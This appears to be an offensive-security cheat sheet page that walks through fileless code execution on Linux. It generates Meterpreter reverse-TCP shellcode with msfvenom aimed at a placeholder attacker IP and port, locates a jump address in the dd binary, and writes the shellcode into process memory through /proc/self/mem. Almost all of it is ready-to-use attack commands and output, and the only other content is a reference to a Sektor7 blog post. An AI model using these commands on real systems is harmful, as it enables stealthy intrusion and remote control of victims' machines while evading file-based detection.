# Scripts

## 01 - `dd`

### 1.1 - Generate Payloads

Generate the shellcode for payload execution.

```
userware@hackware-os:~$ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=<attacker_IP> lport=<attacker_PORT> -f c | grep -Eo "\\\\x[[:xdigit:]]+" | tr -d "\n"
```

### 1.2 - Fileless Code Execution

Retrieve the first addresses of `dd` program.

```
$ setarch x86_64 -R dd if=/proc/self/maps 2>/dev/null | grep /bin/dd
555555554000-555555556000 r--p 00000000 08:01 786821                     /usr/bin/dd
..[omitted]..
```

Dump the program to retrieve the assembly instructions. We'll take the `jmp` operator with the address `6753`.

```
$ objdump -Mintel -d $(which dd) | grep fclose                                  
0000000000002170 <fclose@plt>:
    671a:       e8 51 ba ff ff          call   2170 <fclose@plt>
    6753:       e9 18 ba ff ff          jmp    2170 <fclose@plt>
```

Then we execute in the target with the shellcode through memory.

```
$ echo -en "<shellcode>" | setarch x86_64 -R dd of=/proc/self/mem bs=1 seek=$(( 555555554000 + 0x6753 )) conv=notrunc 10<&0 11<&1
```

---
## References

### Sektor7

- [Sektor7: Pure In-Memory (Shell)Code Injection In Linux Userland](https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md)